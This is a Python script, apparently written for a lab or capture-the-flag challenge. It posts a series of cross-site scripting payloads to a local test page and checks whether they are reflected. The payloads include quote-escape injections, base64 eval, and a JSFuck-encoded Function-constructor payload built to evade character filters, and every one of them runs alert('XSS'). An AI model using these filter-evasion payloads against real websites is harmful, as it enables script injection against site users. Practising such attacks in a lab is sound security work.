import requests
import json

target_url = "http://127.0.0.1:32887/page"

print("[*] Testing XSS payloads with progressive complexity\n")

# Test payloads from simple to complex
test_payloads = []

# 1. Simple quote escape and code execution
print("=== Phase 1: Simple Quote Escapes ===")
simple_tests = [
    '";alert("XSS");//',
    "';alert('XSS');//",
    '";alert(String.fromCharCode(88,83,83));//',
    '";eval(atob("YWxlcnQoJ1hTUycp"));//',  # base64: alert('XSS')
]

for payload in simple_tests:
    print(f"\n[TEST] Payload: {payload}")
    try:
        resp = requests.post(target_url, data={"name": payload}, timeout=10)
        print(f"[+] Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check for XSS indicators in response
        if 'alert' in resp.text and payload in resp.text:
            print(f"[!] Payload reflected unfiltered!")
        if '<script>' in resp.text.lower():
            print(f"[!] Script tags detected in response")
        
        # Print relevant parts of response
        if len(resp.text) < 500:
            print(f"[+] Response:\n{resp.text}")
        else:
            # Search for our payload context
            import re
            context = re.search(r'.{0,100}' + re.escape(payload[:20]) + r'.{0,100}', resp.text)
            if context:
                print(f"[+] Payload context: ...{context.group()}...")
    except Exception as e:
        print(f"[-] Error: {e}")

# 2. Test symbolic access patterns
print("\n\n=== Phase 2: Symbolic Access Patterns ===")
symbolic_tests = [
    '";[][+[]];//',
    '";eval([]);//',
    '";[]["constructor"];//',
    '";this;//',
]

for payload in symbolic_tests:
    print(f"\n[TEST] Payload: {payload}")
    try:
        resp = requests.post(target_url, data={"name": payload}, timeout=10)
        print(f"[+] Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        if len(resp.text) < 500:
            print(f"[+] Response:\n{resp.text}")
    except Exception as e:
        print(f"[-] Error: {e}")

# 3. Implement basic JSFuck encoding
print("\n\n=== Phase 3: JSFuck Encoding ===")

def jsfuck_encode_basic():
    """
    Basic JSFuck encoding implementation
    Uses only: []()!+ characters
    """
    # Core building blocks
    false = '![]'
    true = '!![]'
    undefined = '[][[]]'
    NaN = '+[![]]'
    zero = '+[]'
    one = '+!+[]'
    
    # Build numbers 0-9
    def number(n):
        if n == 0:
            return '+[]'
        return '+' + '!+[]' * n
    
    # Get constructor and string conversion
    # []["constructor"] access
    constructor = '[]["constructor"]'
    
    # Simple approach: use Function constructor
    # Instead of full encoding, let's try a hybrid approach
    
    print("[*] Building JSFuck payload for alert('XSS')")
    
    # Method 1: Try to get alert through window
    # "alert" string construction would be complex, so let's try a simpler payload first
    
    # Method 2: Use eval with encoded string
    # Let's construct a simpler payload that uses JSFuck symbols
    
    # Simplified: Break out of string context with JSFuck that calls alert
    # We need: ";alert('XSS');//  but in JSFuck
    
    # Most practical: Use []["find"]["constructor"]("alert('XSS')")()
    # This evaluates to Function("alert('XSS')")()
    
    payload = '";[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]("alert(\'XSS\')")();//'
    
    return payload

# Try JSFuck payload
jsfuck_payload = jsfuck_encode_basic()
print(f"\n[TEST] JSFuck Payload (length: {len(jsfuck_payload)})")
print(f"[+] Payload preview: {jsfuck_payload[:100]}...")

try:
    resp = requests.post(target_url, data={"name": jsfuck_payload}, timeout=10)
    print(f"[+] Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    # Check response
    if 'alert' in resp.text or 'XSS' in resp.text:
        print(f"[!] Payload components detected in response")
    
    # Print response excerpt
    if len(resp.text) < 1000:
        print(f"[+] Response:\n{resp.text}")
    else:
        print(f"[+] Response (first 500 chars):\n{resp.text[:500]}")
        print(f"[+] Response (last 500 chars):\n{resp.text[-500:]}")
        
except Exception as e:
    print(f"[-] Error: {e}")

